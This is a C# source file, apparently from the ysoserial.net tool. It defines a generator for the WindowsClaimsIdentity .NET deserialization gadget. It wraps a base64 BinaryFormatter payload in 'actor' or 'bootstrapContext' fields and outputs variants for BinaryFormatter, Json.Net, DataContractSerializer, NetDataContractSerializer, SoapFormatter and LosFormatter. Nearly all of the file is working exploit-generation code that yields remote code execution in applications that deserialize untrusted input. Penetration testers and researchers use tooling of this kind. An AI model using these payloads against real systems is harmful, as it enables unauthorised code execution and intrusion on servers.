using System;
using System.Collections.Generic;
using System.Runtime.Serialization;
using Microsoft.IdentityModel.Claims;
using ysoserial.Helpers;
using NDesk.Options;

namespace ysoserial.Generators
{
    public class WindowsClaimsIdentityGenerator : GenericGenerator
    {
        private int variant_number = 1; // Default
        public override string AdditionalInfo()
        {
            return "Requires Microsoft.IdentityModel.Claims namespace (not default GAC)";

            // This is similar to WindowsIdentityGenerator but based on Microsoft.IdentityModel.Claims.WindowsClaimsIdentity
            // "actor" has the same effect as "bootstrapContext" but is shorter. 
        }

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                {"var|variant=", "Payload variant number where applicable. Choices: 1, 2, or 3 based on formatter.", v => int.TryParse(v, out variant_number) },
            };

            return options;
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter (3)", "Json.Net (2)", "DataContractSerializer (2)", "NetDataContractSerializer (3)", "SoapFormatter (2)", "LosFormatter (3)" };
        }

        public override string Name()
        {
            return "WindowsClaimsIdentity";
        }

        public override string Finders()
        {
            return "Soroush Dalili";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.BridgeAndDerived , "Not in GAC"};
        }

        public override string SupportedBridgedFormatter()
        {
            return Formatters.BinaryFormatter;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            byte[] binaryFormatterPayload;
            if (BridgedPayload != null)
            {
                binaryFormatterPayload = (byte[])BridgedPayload;
            }
            else
            {
                IGenerator generator = new TextFormattingRunPropertiesGenerator();
                binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs);
            }

            string b64encoded = Convert.ToBase64String(binaryFormatterPayload);

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
            {
                Object obj = null;

                if (variant_number == 2)
                {
                    obj = new WindowsClaimsIdentityMarshal_var2(b64encoded);
                }
                else if (variant_number == 3)
                {
                    obj = new WindowsClaimsIdentityMarshal_var3(b64encoded);
                }
                else
                {
                    obj = new WindowsClaimsIdentityMarshal_var1(b64encoded);
                }
                 
                return Serialize(obj, formatter, inputArgs);
            }
            else if (formatter.ToLower().Equals("json.net"))
            {
                string payload = "";
                

                if (variant_number == 2)
                {
                    payload = @"{
                    '$type': 'Microsoft.IdentityModel.Claims.WindowsClaimsIdentity, Microsoft.IdentityModel,Version=3.5.0.0,PublicKeyToken=31bf3856ad364e35',
                    'System.Security.ClaimsIdentity.bootstrapContext': '" + b64encoded + @"'
                }";
                }
                else
                {
                    payload = @"{
                    '$type': 'Microsoft.IdentityModel.Claims.WindowsClaimsIdentity, Microsoft.IdentityModel,Version=3.5.0.0,PublicKeyToken=31bf3856ad364e35',
                    'System.Security.ClaimsIdentity.actor': '" + b64encoded + @"'
                }";
                }

                if (inputArgs.Minify)
                {
                    
                    if (inputArgs.UseSimpleType)
                    {
                        payload = JsonHelper.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
                    }
                    else
                    {
                        payload = JsonHelper.Minify(payload, null, null);
                    }
                }


                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.JsonNet_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("datacontractserializer"))
            {

                string payload = "";

                if (variant_number == 2)
                {
                    payload = $@"<root type=""Microsoft.IdentityModel.Claims.WindowsClaimsIdentity, Microsoft.IdentityModel, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"">
    <WindowsClaimsIdentity xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:x=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://schemas.datacontract.org/2004/07/Microsoft.IdentityModel.Claims"">
      <System.Security.ClaimsIdentity.bootstrapContext i:type=""x:string"" xmlns="""">{b64encoded}</System.Security.ClaimsIdentity.bootstrapContext>
       </WindowsClaimsIdentity>
</root>";
                }
                else
                {
                    payload = $@"<root type=""Microsoft.IdentityModel.Claims.WindowsClaimsIdentity, Microsoft.IdentityModel, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"">
    <WindowsClaimsIdentity xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:x=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://schemas.datacontract.org/2004/07/Microsoft.IdentityModel.Claims"">
      <System.Security.ClaimsIdentity.actor i:type=""x:string"" xmlns="""">{b64encoded}</System.Security.ClaimsIdentity.actor>
       </WindowsClaimsIdentity>
</root>";
                }

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = XmlHelper.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
                    }
                    else
                    {
                        payload = XmlHelper.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.DataContractSerializer_deserialize(payload, null, "root", "type");
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("netdatacontractserializer"))
            {
                
                string payload = "";
                if (variant_number == 2)
                {
                    payload = $@"<root>
<w xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" z:Type=""Microsoft.IdentityModel.Claims.WindowsClaimsIdentity"" z:Assembly=""Microsoft.IdentityModel,Version=3.5.0.0,PublicKeyToken=31bf3856ad364e35"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns="""">
  <System.Security.ClaimsIdentity.actor z:Type=""System.String"" z:Assembly=""0"">{b64encoded}</System.Security.ClaimsIdentity.actor>
</w>
</root>
";
                }
                else if (variant_number == 3)
                {
                    payload = $@"<root>
<w xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" z:Type=""Microsoft.IdentityModel.Claims.WindowsClaimsIdentity"" z:Assembly=""Microsoft.IdentityModel,Version=3.5.0.0,PublicKeyToken=31bf3856ad364e35"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns="""">
  <System.Security.ClaimsIdentity.bootstrapContext z:Type=""System.String"" z:Assembly=""0"">{b64encoded}</System.Security.ClaimsIdentity.bootstrapContext>
</w>
</root>
";
                }
                else
                {
                    payload = $@"<root>
<w xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" z:Type=""Microsoft.IdentityModel.Claims.WindowsClaimsIdentity"" z:Assembly=""Microsoft.IdentityModel,Version=3.5.0.0,PublicKeyToken=31bf3856ad364e35"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns="""">
  <_actor z:Type=""System.String"" z:Assembly=""0"" >{b64encoded}</_actor>
  <m_userToken z:Type=""System.IntPtr"" z:Assembly=""0"" xmlns="""">
    <value z:Type=""System.Int64"" z:Assembly=""0"">0</value>
  </m_userToken>
  <_label i:nil=""true""/>
  <_nameClaimType i:nil=""true""/>
  <_roleClaimType i:nil=""true""/>
</w>
</root>
";
                }

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = XmlHelper.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null);
                    }
                    else
                    {
                        payload = XmlHelper.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.NetDataContractSerializer_deserialize(payload, "root");
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("soapformatter"))
            {

                string payload = "";

                if (variant_number == 2)
                {
                    payload = $@"<SOAP-ENV:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
<SOAP-ENV:Body>
    <a1:WindowsClaimsIdentity id=""ref-1"" xmlns:a1=""http://schemas.microsoft.com/clr/nsassem/Microsoft.IdentityModel.Claims/Microsoft.IdentityModel, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"">
      <System.Security.ClaimsIdentity.bootstrapContext xsi:type=""xsd:string"" xmlns="""">{b64encoded}</System.Security.ClaimsIdentity.bootstrapContext>
    </a1:WindowsClaimsIdentity>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
";
                }
                else
                {
                    payload = $@"<SOAP-ENV:Envelope xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
<SOAP-ENV:Body>
    <a1:WindowsClaimsIdentity id=""ref-1"" xmlns:a1=""http://schemas.microsoft.com/clr/nsassem/Microsoft.IdentityModel.Claims/Microsoft.IdentityModel, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"">
      <System.Security.ClaimsIdentity.actor xsi:type=""xsd:string"" xmlns="""">{b64encoded}</System.Security.ClaimsIdentity.actor>
    </a1:WindowsClaimsIdentity>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
";
                }

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = XmlHelper.Minify(payload, new string[] { "Microsoft.IdentityModel" }, null, FormatterType.SoapFormatter);
                    }
                    else
                    {
                        payload = XmlHelper.Minify(payload, null, null, FormatterType.SoapFormatter);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.SoapFormatter_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }

    [Serializable]
    public class WindowsClaimsIdentityMarshal_var1 : ISerializable
    {
        public WindowsClaimsIdentityMarshal_var1()
        {
            B64Payload = "";
        }

        public WindowsClaimsIdentityMarshal_var1(string b64payload)
        {
            B64Payload = b64payload;
        }

        private string B64Payload { get; }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(WindowsClaimsIdentity));
            info.AddValue("_actor", B64Payload);
            info.AddValue("m_userToken", new IntPtr(0));
            info.AddValue("_label", null);
            info.AddValue("_nameClaimType", null);
            info.AddValue("_roleClaimType", null);
        }
    }

    [Serializable]
    public class WindowsClaimsIdentityMarshal_var2 : ISerializable
    {
        public WindowsClaimsIdentityMarshal_var2()
        {
            B64Payload = "";
        }

        public WindowsClaimsIdentityMarshal_var2(string b64payload)
        {
            B64Payload = b64payload;
        }

        private string B64Payload { get; }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(WindowsClaimsIdentity));
            info.AddValue("System.Security.ClaimsIdentity.actor", B64Payload);
        }
    }

    [Serializable]
    public class WindowsClaimsIdentityMarshal_var3 : ISerializable
    {
        public WindowsClaimsIdentityMarshal_var3()
        {
            B64Payload = "";
        }

        public WindowsClaimsIdentityMarshal_var3(string b64payload)
        {
            B64Payload = b64payload;
        }

        private string B64Payload { get; }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(WindowsClaimsIdentity));
            info.AddValue("System.Security.ClaimsIdentity.bootstrapContext", B64Payload);
        }
    }

}
